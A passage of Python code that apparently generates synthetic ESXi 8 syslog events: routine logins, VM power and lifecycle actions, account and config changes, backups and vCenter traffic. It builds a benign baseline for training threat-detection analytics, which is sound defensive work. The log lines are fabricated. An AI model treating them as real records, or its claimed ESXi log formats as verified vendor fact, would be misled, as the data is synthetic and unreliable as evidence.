    event with the operator's tag ('is stopping' / 'is starting' / 'is being suspended')
    and the system logs the end state without one, then the TaskManager pair."""
    vmid = _vm_id(config, vm)
    opid = opid or (_opid() if user else None)
    if action == "powerOff":
        return ([_vm_event(config, host, vm, "is stopping", opid=opid, user=user, sid=sid, gap="  "),
                 _vm_event(config, host, vm, "is powered off", gap="  ")]
                + _task_lines(config, host, vmid, "VirtualMachine.powerOff", opid=opid, user=user, sid=sid))
    if action == "powerOn":
        return ([_vm_event(config, host, vm, "is starting", opid=opid, user=user, sid=sid),
                 _vm_event(config, host, vm, "has powered on")]
                + _task_lines(config, host, vmid, "VirtualMachine.powerOn", opid=opid, user=user, sid=sid))
    if action == "suspend":
        return ([_vm_event(config, host, vm, "is being suspended", opid=opid, user=user, sid=sid),
                 _vm_event(config, host, vm, "is suspended")]
                + _task_lines(config, host, vmid, "VirtualMachine.suspend", opid=opid, user=user, sid=sid))
    if action == "reset":
        return ([_vm_event(config, host, vm, "is reset", opid=opid, user=user, sid=sid, gap="  "),
                 _vm_event(config, host, vm, "has powered on")]
                + _task_lines(config, host, vmid, "VirtualMachine.reset", opid=opid, user=user, sid=sid))
    # guest OS operations through VMware Tools
    phrase = {"rebootGuest": "Guest OS reboot for", "shutdownGuest": "Guest OS shut down for",
              "standbyGuest": "Guest OS standby for"}[action]
    return ([_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                         f"Event {_ev(host)} : {phrase} {vm} on {host} in ha-datacenter",
                         opid=opid, user=user)]
            + _task_lines(config, host, vmid, f"VirtualMachine.{action}", opid=opid, user=user, sid=sid))


def _datastore_transfer(config, host, direction, ds, path, user, src, agent):
    """A datastore-browser file transfer over /folder as ESXi 8 logs it: the HTTP server
    request line (the only line naming the user) and the system event naming the client
    as '<user agent>@<ip>'.  direction is 'download' (GET) or 'upload' (PUT)."""
    verb = "GET" if direction == "download" else "PUT"
    prep = "from" if direction == "download" else "to"
    req = f"{random.randint(0, 0xffffffffffff):016x}"
    return [
        _hostd_line(config, host, "info", f"HTTP server /folder req={req}",
                    f"Got HTTP {verb} request for /folder/{path}?dcPath=ha-datacenter&dsName={ds}",
                    user=user),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {_ev(host)} : File {direction} {prep} path '[{ds}]{path}' was "
                    f"initiated from '{agent}@{src}' and completed with status ''"),
    ]


def _b_vpxa_poll(config, host, session_context):
    """The dominant ambient event: vpxa's periodic status poll. High volume, verbose."""
    return _hostd_line(config, host, "verbose", "vpxLro",
                       f"Completed work for request; total requests outstanding: "
                       f"{random.randint(0, 4)}",
                       opid=f"PollQuickStatsLoop-{random.randint(0, 0xffffff):06x}")


def _b_shell_command(config, host, session_context):
    """Common-command baseline the 'uncommon command' analytics train against: an
    operator's short interactive shell session of routine status / inventory commands."""
    cmds = random.sample(_COMMON_COMMANDS, k=random.randint(1, 3))
    return _shell_cmds(config, host, cmds, start=random.random() < 0.4)


def _b_vsphere_session(config, host, session_context):
    """A Host Client / API login or logout. Login = HaSessionManager accept + 'logged in
    as <agent>'; logout = 'logged out (login time: ..., number of API invocations: N,
    user agent: ...)' carrying user=."""
    user, src = _resolve_admin(config, session_context)
    agent = random.choice([_BROWSER_UA, "VMware-client/8.0.3",
                           "pyvmomi Python/3.11.9 (Linux; 5.15.0; x86_64)", "PowerCLI/13.3.0"])
    if random.random() < 0.55:
        return _api_login(config, host, user, src, agent=agent)
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {_ev(host)} : User {user}@{src} logged out (login time: "
                       f"{_login_time()}, number of API invocations: {random.randint(1, 400)}, "
                       f"user agent: {agent})", opid=_opid(), user=user,
                       sid=_sid(f"{host}|{user}|{src}"))


def _b_shell_login(config, host, session_context):
    """Interactive logins — SSH, local ESXi Shell, or DCUI console — covering both
    SUCCESS and FAILURE:

      SSH success   sshd-session accept + pam session + vobd/hostd "SSH session was
                    opened", and the matching close sequence.
      SSH failure   pam auth failure + 'error: PAM: Authentication failure' + vobd/hostd
                    "SSH login has failed" (benign single mistype; ssh_brute_force is
                    the high-volume version).
      ESXi Shell /  hostd "User <u>@127.0.0.1 logged in/out as ESXi Shell|DCUI" on
      DCUI          success; hostd "Cannot login <u>@127.0.0.1" on failure.
    """
    user, src = _resolve_admin(config, session_context)
    channel = random.choices(["ssh", "esxi_shell", "dcui"], weights=[55, 25, 20], k=1)[0]
    success = random.random() < 0.82     # mostly clean; a minority are failed attempts
    ev = _ev(host)

    if channel == "ssh":
        if success:
            if random.random() < 0.65:   # session open
                method = random.choice(["keyboard-interactive/pam", "keyboard-interactive/pam",
                                        "publickey"])
                return _ssh_session_open(config, host, user, src, method=method)
            return (_vob_audit(config, host, "vob.user.ssh.session.closed",   # session close
                               f"SSH session was closed for '{user}@{src}'.")
                    + [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                                   f"Event {ev} : SSH session was closed for '{user}@{src}'."),
                       _sshd_line(config, host, f"session closed for user {user}", pam="session")])
        if random.random() < 0.3:        # single failed SSH attempt
            return _ssh_auth_failure(config, host,
                                     random.choice(["admin", "administrator", "guest", "test"]),
                                     src, invalid=True)
        return _ssh_auth_failure(config, host, user, src)

    # Local ESXi Shell / DCUI — loopback console.
    client = "ESXi Shell" if channel == "esxi_shell" else "DCUI"
    if success:
        verb = "logged in" if random.random() < 0.7 else "logged out"
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User {user}@127.0.0.1 {verb} as {client}",
                           opid=_opid(), user=user)
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Cannot login {user}@127.0.0.1 ({client})",
                       opid=_opid(), user=user)


def _b_ssh_service_toggle(config, host, session_context):
    """Routine maintenance: an admin enables or disables SSH or the ESXi Shell. Real
    operators turn SSH on for a task and off afterwards, so BOTH states are normal here
    (the uncommon-command and lateral-movement threats are a separate, actor-driven
    path)."""
    user, src = _resolve_admin(config, session_context)
    return _service_toggle_lines(config, host, user, random.choice(["SSH", "ESXi Shell"]),
                                 random.random() < 0.5)


def _b_vm_power(config, host, session_context):
    """A VM power / guest-OS state change — the routine on/off/suspend/reset/shutdown/
    reboot that happens constantly in any ESX environment. On a vCenter-managed host most
    are driven by vpxuser; the rest by an admin in the Host Client."""
    vm = random.choice(_vms(config))
    action = random.choices(
        ["powerOn", "powerOff", "suspend", "reset", "shutdownGuest", "rebootGuest", "standbyGuest"],
        weights=[26, 22, 8, 6, 16, 12, 10], k=1)[0]
    if random.random() < 0.7:
        return _vm_power_lines(config, host, vm, action, user="vpxuser", opid=_opid("vpx"))
    user, src = _resolve_admin(config, session_context)
    return _vm_power_lines(config, host, vm, action, user=user)


def _b_vm_lifecycle(config, host, session_context):
    """Day-to-day VM administration beyond power: create, clone, reconfigure, vMotion
    migration, and snapshot removal/consolidation."""
    vm = random.choice(_vms(config))
    vmid = _vm_id(config, vm)
    opid = _opid("vpx")
    kind = random.choice(["create", "clone", "reconfigure", "migrate", "remove_snapshot",
                          "consolidate"])
    if kind == "create":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Created virtual machine {vm} on {host} in "
                           f"ha-datacenter", opid=opid, user="vpxuser")
    if kind == "clone":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Cloning {vm} on host {host} in ha-datacenter "
                           f"to {vm}-clone", opid=opid, user="vpxuser")
    if kind == "reconfigure":
        return ([_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                             f"Event {_ev(host)} : Reconfigured {vm} on {host} in ha-datacenter",
                             opid=opid, user="vpxuser")]
                + _task_lines(config, host, vmid, "VirtualMachine.reconfigure", opid=opid, user="vpxuser"))
    if kind == "migrate":
        others = [h for h in _hosts(config) if h != host] or [host]
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Migration of {vm} from {host} to "
                           f"{random.choice(others)} in ha-datacenter completed",
                           opid=opid, user="vpxuser")
    if kind == "consolidate":
        return ([_hostd_line(config, host, "info", _vmx_sub(config, vm),
                             "Consolidate Disks: started", opid=opid, user="vpxuser")]
                + _task_lines(config, host, vmid, "VirtualMachine.consolidateDisks", opid=opid, user="vpxuser"))
    return ([_hostd_line(config, host, "info", _vmx_sub(config, vm),     # remove_snapshot
                         "Remove Snapshot: Backup snapshot", opid=opid, user="vpxuser")]
            + _task_lines(config, host, vmid, "vm.Snapshot.remove", opid=opid, user="vpxuser"))


def _b_snapshot(config, host, session_context):
    """Backup-job snapshot creation (quiesced), driven from vCenter."""
    vm = random.choice(_vms(config))
    opid = _opid("vpx")
    return ([_hostd_line(config, host, "verbose", _vmx_sub(config, vm),
                         "Create Snapshot: Backup snapshot, memory=false, quiescent=true state=5",
                         opid=opid, user="vpxuser")]
            + _task_lines(config, host, _vm_id(config, vm), "VirtualMachine.createSnapshot",
                          opid=opid, user="vpxuser"))


def _b_maintenance_mode(config, host, session_context):
    """Host entering / exiting maintenance mode, and the PLANNED reboot that happens
    inside a maintenance window — the baseline the unplanned_reboot threat stands against
    (a reboot with no surrounding maintenance event is the signal)."""
    user, src = _resolve_admin(config, session_context)
    choice = random.choices(["enter", "exit", "planned_reboot"], weights=[40, 40, 20], k=1)[0]
    if choice == "planned_reboot":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Host {host} in ha-datacenter is being rebooted by "
                           f"{user}@{src} (in maintenance mode, no running VMs)", opid=_opid(), user=user)
    state = "has entered maintenance mode" if choice == "enter" else "has exited maintenance mode"
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {_ev(host)} : Host {host} in ha-datacenter {state}", opid=_opid(), user=user)


def _b_storage(config, host, session_context):
    ds = random.choice(_datastores(config))
    body = random.choice([
        f"Received volume state change event for '{ds}' going online",
        f"Device naa.{random.randint(10**19, 10**20):x} performance has deteriorated. "
        f"I/O latency increased to {random.randint(1500, 4000)} microseconds.",
        f"NFS volume '{ds}' is accessible again",
    ])
    sev = "warning" if "deteriorated" in body else "info"
    return _hostd_line(config, host, sev, "Vmsvc.vm", body, opid=_opid())


def _b_crond(config, host, session_context):
    """crond's scheduled host jobs (health probe, storage monitor, memstats, config
    auto-backup) — the real 8.0.3 cron table."""
    return _crond_line(config, host, random.choice(_CRON_JOBS))


def _b_service_health(config, host, session_context):
    return _hostd_line(config, host, "info", "Hostsvc", random.choice([
        "Current working directory reset to /",
        "VMFS heartbeat succeeded on all datastores",
        f"Health status: green (checked {random.randint(20, 60)} sensors)",
        "NTP time synchronization completed",
    ]), opid=_opid())


def _b_vmkernel(config, host, session_context):
    """Kernel-layer activity: storage path / device, networking NIC link, SCSI sense,
    and hardware-sensor events — the vmkernel.log / vmkwarning.log content."""
    naa = f"naa.{random.randint(10**19, 10**20):x}"
    choice = random.choices(
        ["path_change", "scsi", "apd", "pdl", "nic_link", "sensor", "mem"],
        weights=[22, 18, 6, 4, 20, 15, 15], k=1)[0]
    if choice == "path_change":
        return _vmkernel_line(config, host, "ScsiPath",
                              f"vmhba{random.randint(0,3)}:C0:T{random.randint(0,4)}:L0 "
                              f"changed state from {random.choice(['on','off','standby'])} "
                              f"(device {naa})")
    if choice == "scsi":
        return _vmkernel_line(config, host, "ScsiDeviceIO",
                              f"Cmd(0x{random.randint(0,0xffffff):06x}) 0x2a, CmdSN 0x{random.randint(0,0xffff):x} "
                              f"to dev \"{naa}\" failed H:0x0 D:0x2 P:0x0 Sense Data: 0x5 0x24 0x0",
                              severity=random.choice(["info", "warning"]))
    if choice == "apd":
        return _vmkernel_line(config, host, "WARNING: ScsiDevice",
                              f"Device {naa} has entered the All Paths Down state.",
                              severity="warning")
    if choice == "pdl":
        return _vmkernel_line(config, host, "WARNING: ScsiDevice",
                              f"Device {naa} has been removed or is permanently inaccessible. (PDL)",
                              severity="warning")
    if choice == "nic_link":
        up = random.random() < 0.7
        return _vmkernel_line(config, host, "Uplink",
                              f"vmnic{random.randint(0,5)} link {'up' if up else 'down'} "
                              f"- {random.choice(['1000','10000','25000'])} Mbps, full duplex")
    if choice == "sensor":
        return _vmkernel_line(config, host, "IntrCookie",
                              random.choice([
                                  "Hardware sensor 'Fan 2' state changed to green",
                                  "Hardware sensor 'Power Supply 1' state changed to green",
                                  "Hardware sensor 'System Board Temp' reading nominal",
                              ]))
    return _vmkernel_line(config, host, "MemSched",
                          f"Admission check: host memory {random.randint(40,85)}% committed")


def _b_ha_drs(config, host, session_context):
    """vSphere HA (fdm) and DRS cluster activity — heartbeats, elections, and DRS /
    vMotion load-balancing recommendations."""
    if random.random() < 0.55:
        return _fdm_line(config, host, random.choice([
            "FDM master heartbeat received from all slaves",
            f"Datastore heartbeat healthy on {random.choice(_datastores(config))}",
            "This host has been elected as the HA master",
            "Host isolation address responded; host is not isolated",
        ]))
    vm = random.choice(_vms(config))
    others = [h for h in _hosts(config) if h != host] or [host]
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {_ev(host)} : DRS migrated {vm} "
                       f"from {host} to {random.choice(others)} to balance load",
                       opid=_opid())


def _b_service_control(config, host, session_context):
    """Routine service / daemon control: restarts, certificate refresh, NTP daemon."""
    user, src = _resolve_admin(config, session_context)
    choice = random.choice(["restart", "cert", "ntp", "ruleset"])
    if choice == "restart":
        svc = random.choice(["hostd", "vpxa", "ntpd", "DCUI", "vobd"])
        return _hostd_line(config, host, "info", "Hostsvc",
                           f"Service {svc} restarted (watchdog)", opid=_opid())
    if choice == "cert":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Host SSL certificate "
                           f"was renewed on {host}", opid=_opid(), user=user)
    if choice == "ntp":
        return _vmkernel_line(config, host, "NTPClock",
                              f"synchronized to time server {random.choice(['time.google.com','pool.ntp.org'])}")
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {_ev(host)} : Firewall ruleset "
                       f"{random.choice(['ntpClient','sshServer','CIMHttpsServer'])} "
                       f"{random.choice(['enabled','refreshed'])} on {host}",
                       opid=_opid(), user=user)


def _b_account_admin(config, host, session_context):
    """Routine, benign local-account lifecycle and permission administration — the full
    create / disable / delete / password / role / lockout / review set an estate shows
    during onboarding, offboarding, and account hygiene. (The malicious create is the
    local_account_created threat; attacker-driven disable/delete go through the shell as
    uncommon commands.) Permission text is ESXi 8's: 'Permission created for <u> on
    root, role is <Role>, propagation is Enabled' / 'Permission rule removed for <u> on root'."""
    actor, src = _resolve_admin(config, session_context)
    target = random.choice(_admins(config) + ["operator", "monitoring", "backupsvc",
                                              "contractor1", "auditor"])
    ev = _ev(host)
    opid = _opid()
    action = random.choices(
        ["password", "role_assign", "role_remove", "create", "disable", "delete",
         "lockout", "review"],
        weights=[20, 14, 10, 14, 10, 8, 10, 14], k=1)[0]

    def event(body, severity="info", user=actor):
        return _hostd_line(config, host, severity, "Vimsvc.ha-eventmgr", f"Event {ev} : {body}",
                           opid=opid if user else None, user=user)

    if action == "create":
        return ([event(f"Account {target} was created on host {host}")]
                + _task_lines(config, host, "ha-folder-root", "host.LocalAccountManager.createUser",
                              opid=opid, user=actor))
    if action == "delete":
        return ([event(f"Account {target} was removed on host {host}")]
                + _task_lines(config, host, "ha-folder-root", "host.LocalAccountManager.removeUser",
                              opid=opid, user=actor))
    if action == "disable":
        # ESXi local accounts are "disabled" by revoking access — the No access role.
        return event(f"Permission created for {target} on root, role is No access, "
                     f"propagation is Enabled")
    if action == "lockout":
        n = random.choice([60, 120, 300, 900])
        m = random.randint(5, 10)
        return event(f"Remote access for ESXi local user account '{target}' has been locked "
                     f"for {n} seconds after {m} failed login attempts.", severity="warning",
                     user=None)
    if action == "role_assign":
        role = random.choice(["Read-only", "Read-only", "Administrator"])
        return event(f"Permission created for {target} on root, role is {role}, "
                     f"propagation is Enabled")
    if action == "role_remove":
        return event(f"Permission rule removed for {target} on root")
    if action == "password":
        return event(f"Password was changed for account {target} on host {host}")
    return event(f"Account {target} was reviewed on host {host}")


def _b_stale_account_login(config, host, session_context):
    """A login ATTEMPT against an account that should not work — a DISABLED account (still
    present, access revoked) or a DELETED/offboarded account (no longer present). Over SSH
    both fail PAM; the deleted one also logs OpenSSH's 'Invalid user'. Benign-weighted
    (stale automation creds, an admin fat-fingering an offboarded name) but
    security-relevant on its own. Covers SSH and the local console."""
    src = random_external_ip(config) if random.random() < 0.5 else _mgmt_ip(config)
    ssh = random.random() < 0.6
    ev = _ev(host)

    if random.random() < 0.5:
        # DISABLED account — exists, access revoked.
        u = random.choice(_disabled_accounts(config))
        if ssh:
            return _ssh_auth_failure(config, host, u, src)
        return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Cannot login {u}@127.0.0.1 (account disabled)",
                           opid=_opid(), user=u)

    # DELETED / offboarded account — no such user.
    u = random.choice(_former_accounts(config))
    if ssh:
        return _ssh_auth_failure(config, host, u, src, invalid=True)
    return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Cannot login {u}@127.0.0.1 (no such user)",
                       opid=_opid())


# ── Policy / configuration changes ─────────────────────────────────────────────

# Benign values for the advanced settings admins actually tune: shell timeouts, password
# and lockout policy, log levels, the DCUI banner, BPDU filter, session timeout. (The
# syslog-logHost clear is the remote_syslog_disabled threat; the same mechanism carries
# ordinary tuning here.)
_BENIGN_ADVANCED_SETTINGS = [
    ("UserVars.ESXiShellTimeOut", "900"),
    ("UserVars.ESXiShellInteractiveTimeOut", "900"),
    ("UserVars.HostClientSessionTimeout", "900"),
    ("Security.AccountLockFailures", "5"),
    ("Security.AccountUnlockTime", "900"),
    ("Security.PasswordQualityControl", "retry=3 min=disabled,disabled,disabled,7,7"),
    ("Security.PasswordMaxDays", "90"),
    ("Config.HostAgent.log.level", "info"),
    ("Syslog.global.logLevel", "info"),
    ("Annotations.WelcomeMessage", "Authorized use only"),
    ("Net.BlockGuestBPDU", "1"),
    ("UserVars.SuppressShellWarning", "0"),
]

_PORTGROUPS = ["VM Network", "Prod-VLAN110", "Mgmt-VLAN10", "vMotion", "Backup-VLAN30"]


def _b_config_change(config, host, session_context):
    """Routine host policy / configuration changes by the ops team: advanced settings
    (password / lockout / shell-timeout policy), lockdown mode, NTP / DNS, vSwitch
    port-group security policy, firewall allowed-IP lists, role definitions. hostd records
    both the low-level 'Set called with key' and the higher-level Event."""
    user, src = _resolve_admin(config, session_context)
    ev = _ev(host)
    kind = random.choices(["advanced", "lockdown", "ntp_dns", "portgroup", "fw_allowed", "role"],
                          weights=[34, 10, 14, 14, 14, 14], k=1)[0]
    if kind == "advanced":
        key, val = random.choice(_BENIGN_ADVANCED_SETTINGS)
        return [
            _hostd_line(config, host, "info", "Vimsvc", f'Set called with key "{key}", value "{val}"',
                        opid=_opid(), user=user),
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Advanced option {key} changed to '{val}' on {host} "
                        f"by {user}@{src}", opid=_opid(), user=user),
        ]
    if kind == "lockdown":
        # Admins drop lockdown for a maintenance task and restore it afterwards.
        a, b = random.choice([("Disabled", "Normal"), ("Disabled", "Normal"), ("Normal", "Disabled")])
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Lockdown mode of host {host} changed from {a} to {b} "
                           f"by {user}@{src}", opid=_opid(), user=user)
    if kind == "ntp_dns":
        if random.random() < 0.5:
            servers = random.choice(["10.0.10.10, 10.0.20.10", "time.google.com, pool.ntp.org"])
            body = f"NTP server list updated to [{servers}] on {host}"
        else:
            body = (f"DNS configuration changed on {host}: servers 10.0.10.10, 10.0.20.10, "
                    f"search domain corp.examplecorp.local")
        return _hostd_line(config, host, "info", "Hostsvc", body, opid=_opid(), user=user)
    if kind == "portgroup":
        # Hardening a port group from the shell (ESXi 8 logs no event for this, only the
        # command and its dispatch). The promiscuous_mode threat sets the same options true.
        pg = random.choice(_PORTGROUPS)
        opt = random.choice(["--allow-promiscuous", "--allow-forged-transmits", "--allow-mac-change"])
        return _shell_cmds(config, host, [
            f'esxcli network vswitch standard portgroup policy security set -p "{pg}" {opt}=false'])
    if kind == "fw_allowed":
        ruleset = random.choice(["sshServer", "vSphereClient", "webAccess", "CIMHttpsServer"])
        subnet = mgmt_plane.conf(config)["admin_subnet"]
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Firewall ruleset {ruleset} allowed IP list set to "
                           f"{subnet} on {host} by {user}@{src}", opid=_opid(), user=user)
    role = random.choice(["BackupOperator", "MonitoringReadOnly", "VMOperator", "HelpdeskConsole"])
    verb = random.choice(["created", "modified"])
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : Role {role} was {verb} on host {host} by {user}@{src}",
                       opid=_opid(), user=user)


def _b_service_policy(config, host, session_context):
    """A host service's startup policy or running state changed — SSH / ESXi Shell / NTP /
    CIM / SNMP start policy, or a start / stop / restart."""
    user, src = _resolve_admin(config, session_context)
    svc, policies = random.choice([
        ("TSM-SSH", ["on", "off", "automatic"]),
        ("TSM", ["on", "off"]),              # ESXi Shell
        ("ntpd", ["on", "automatic"]),
        ("sfcbd-watchdog", ["off", "on"]),   # CIM
        ("snmpd", ["off", "on"]),
    ])
    ev = _ev(host)
    if random.random() < 0.6:
        pol = random.choice(policies)
        body = f"Event {ev} : Service {svc} startup policy changed to '{pol}' on {host}"
    else:
        act = random.choice(["started", "stopped", "restarted"])
        body = f"Event {ev} : Service {svc} {act} on {host}"
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", body, opid=_opid(), user=user)


def _b_patch_activity(config, host, session_context):
    """Benign patch / VIB maintenance — the legitimate counterpart to the VIB-bypass
    threat: a signed VIB install and an image-profile compliance scan via esxupdate."""
    user, src = _resolve_admin(config, session_context)
    pri = _pri(_FAC_USER, "info")
    pid = random.randint(2100000, 2600000)
    if random.random() < 0.5:
        vib = random.choice(["VMware_bootbank_esx-base", "VMW_bootbank_nvme-pcie",
                             "VMware_bootbank_esx-update", "VMW_bootbank_vmkusb"])
        return (f"<{pri}>{_ts()} {host} esxupdate[{pid}]: esxupdate: INFO: Installed VIB "
                f"{vib} (acceptance level VMwareCertified)")
    return (f"<{pri}>{_ts()} {host} esxupdate[{pid}]: esxupdate: INFO: Scanning image "
            f"profile against depot; host is compliant")


# ── Runtime activity ────────────────────────────────────────────────────────────

def _b_vcenter_sync(config, host, session_context):
    """vCenter <-> host management traffic over vpxa: vpxuser login / logout, inventory
    and task syncs, heartbeat, connect / disconnect / reconnect. On a managed host this is
    the bulk of authenticated activity — most hostd logins are vpxuser, not people."""
    vc_name, vc_ip = _vcenter(config)
    ev = _ev(host)
    kind = random.choices(
        ["heartbeat", "vpxa_task", "vpxuser_login", "vpxuser_logout", "connected",
         "disconnected", "reconnect"],
        weights=[30, 30, 12, 8, 6, 6, 8], k=1)[0]
    if kind == "heartbeat":
        return _hostd_line(config, host, "verbose", "vpxLro",
                           f"Sent heartbeat to vCenter Server {vc_ip}; sequence "
                           f"{random.randint(1000, 999999)}",
                           opid=f"hb-{random.randint(0, 0xffffff):06x}")
    if kind == "vpxa_task":
        op = random.choice(["vim.host.StorageSystem.refresh", "vim.host.NetworkSystem.refresh",
                            "vpxapi.VpxaService.retrieveChanges", "vim.PerformanceManager.queryStats",
                            "vim.HostSystem.retrieveInternalConfigManager"])
        return _hostd_line(config, host, "verbose", "vpxLro",
                           f"Task {op} invoked by vCenter {vc_name} completed",
                           opid=f"vpxd-{random.randint(0, 0xffffff):06x}")
    if kind == "vpxuser_login":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User vpxuser@{vc_ip} logged in as VMware-client/8.0.0",
                           opid=_opid(), user="vpxuser")
    if kind == "vpxuser_logout":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : User vpxuser@{vc_ip} logged out (login time: {_ts()}, "
                           f"number of API invocations: {random.randint(50, 4000)}, user agent: "
                           f"VMware-client/8.0.0)", opid=_opid(), user="vpxuser")
    if kind == "connected":
        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Host {host} is connected to vCenter Server {vc_ip}",
                           opid=_opid())
    if kind == "disconnected":
        return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                           f"Event {ev} : Host {host} has lost connection to vCenter Server {vc_ip}",
                           opid=_opid())
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {ev} : vpxa reconnected to vCenter Server {vc_ip}", opid=_opid())


def _b_backup_job(config, host, session_context):
    """The scheduled VM backup: the backup proxy snapshots a VM, reads its disk, then
    removes the snapshot. The BENIGN baseline the vm_disk_export threat stands against —
    same datastore read, but the known proxy IP and service account."""
    proxy_ip, acct = _backup_proxy(config)
    vm = random.choice(_vms(config))
    ds = random.choice(_datastores(config))
    opid = _opid("vpx")
    vmid = _vm_id(config, vm)
    return ([_hostd_line(config, host, "verbose", _vmx_sub(config, vm),
                         "Create Snapshot: VEEAM BACKUP TEMP, memory=false, quiescent=true state=5",
                         opid=opid, user=acct)]
            + _task_lines(config, host, vmid, "VirtualMachine.createSnapshot", opid=opid, user=acct)
            + _datastore_transfer(config, host, "download", ds, f"{vm}/{vm}-flat.vmdk", acct,
                                  proxy_ip, "VMware-client/8.0.3")
            + _task_lines(config, host, vmid, "vm.Snapshot.remove", opid=opid, user=acct))


def _b_datastore_ops(config, host, session_context):
    """Routine datastore / storage administration — HBA rescan, NFS mount, capacity, grow,
    and ISO / template uploads to the library by the vCenter service account."""
    ds = random.choice(_datastores(config))
    ev = _ev(host)
    if random.random() < 0.2:
        iso = random.choice(["ubuntu-24.04.iso", "Win2022.iso", "rhel9.iso", "vcenter-template.ovf"])
        return _datastore_transfer(config, host, "upload", ds, f"ISO/{iso}", "svc_vcenter",
                                   mgmt_plane.admin_source(config), "VMware-client/8.0.3")
    body = random.choice([
        f"Event {ev} : Rescan of all HBAs on {host} completed",
        f"Event {ev} : NFS datastore {ds} mounted on {host}",
        f"Event {ev} : Datastore {ds} on {host} is {random.randint(60, 88)}% full",
        f"Event {ev} : VMFS volume {ds} was expanded on {host}",
    ])
    sev = "warning" if ("% full" in body and int(body.split("% full")[0].split()[-1]) >= 85) else "info"
    return _hostd_line(config, host, sev, "Vimsvc.ha-eventmgr", body)


def _b_guest_ops(config, host, session_context):
    """Routine VMware Tools / guest interaction — the legitimate baseline for the
    guest_ops_exec threat (which pushes programs/files INTO guests). Here: Tools-driven
    guest shutdown/restart, time sync, heartbeat, and Tools upgrades."""
    vm = random.choice(_vms(config))
    ev = _ev(host)
    body = random.choice([
        f"Event {ev} : Guest OS of {vm} on {host} was gracefully shut down via VMware Tools",
        f"Event {ev} : Guest OS of {vm} on {host} was restarted via VMware Tools",
        f"Event {ev} : VMware Tools on {vm} ({host}) was upgraded to the current version",
        f"Event {ev} : Time synchronized with guest {vm} via VMware Tools on {host}",
        f"Event {ev} : VMware Tools heartbeat on {vm} ({host}) is green",
    ])
    return _hostd_line(config, host, "info", _vmx_sub(config, vm), body, opid=_opid())


_ENVOY_UI_PATHS = ["/ui/", "/ui/views/host/manage/hardware/power-management.html",
                   "/ui/views/host/manage/security/lockdown.html", "/ui/images/pullTab.png",
                   "/ui/templates/vm/vm-console.html", "/ui/scripts/main.js"]
_ENVOY_SDK_OPS = ["RetrieveServiceContent", "RetrievePropertiesEx", "WaitForUpdatesEx",
                  "DynamicTypeMgrQueryTypeInfo", "CurrentTime"]


def _b_envoy(config, host, session_context):
    """envoy-access, ESXi 8's reverse proxy on 443 — a large share of a real host's
    volume: an admin's Host Client pulling UI assets and SOAP calls over HTTP/2, and the
    loopback /sdk traffic of hostd-probe and the local CLIs (tagged with the caller)."""
    kind = random.choices(["ui", "sdk", "probe", "cli"], weights=[30, 30, 25, 15], k=1)[0]
    if kind in ("ui", "sdk"):
        user, src = _resolve_admin(config, session_context)
        client = f"{src}:{random.randint(30000, 65000)}"
        if kind == "ui":
            return _envoy_line(config, host, "GET", random.choice(_ENVOY_UI_PATHS), 200, client)
        return _envoy_line(config, host, "POST", "/sdk/", 200, client, upstream="127.0.0.1:8307",
                           rx=random.randint(500, 900))
    if kind == "probe":
        tag = f'"hostd-probe" "{random.choice(["Fetch", "RetrieveServiceContent"])}"'
    else:
        tag = f'"esxcli-{random.randint(0, 0xff):02x}" "{random.choice(_ENVOY_SDK_OPS)}"'
    pid = _stable(host + "envoy", 1049500, 1049530)
    return (f"<{_pri(_FAC_LOCAL4, 'info')}>{_ts()} {host} envoy-access[{pid}]: POST /sdk 200 "
            f"via_upstream - {random.randint(500, 900)} {random.randint(200, 17000)} - 0 0 0 "
            f"127.0.0.1:{random.randint(20000, 65000)} HTTP/1.1 - 127.0.0.1:80 "
            f"127.0.0.1:{random.randint(20000, 65000)} HTTP/1.1 - 127.0.0.1:8307 {tag}")


# Benign mix — (generator, weight, human). `human` events are admin / config / login
# driven and cluster in business hours; the rest are machine-driven and run around the
# clock, dominating off-hours (see _benign's activity_weight gate). Weights keep the
# ambient poll + vCenter sync on top while every named activity still appears reliably.
_BENIGN_MIX = [
    (_b_vpxa_poll,          18, False),
    (_b_vcenter_sync,       14, False),  # vpxuser/vpxa sync — bulk of managed-host auth
    (_b_shell_command,      12, False),  # common-command baseline for the rarity analytics
    (_b_vmkernel,           11, False),  # storage path/SCSI/APD/PDL, NIC link, sensors
    (_b_vm_power,            9, False),  # VM power on/off/suspend/reset/guest shutdown
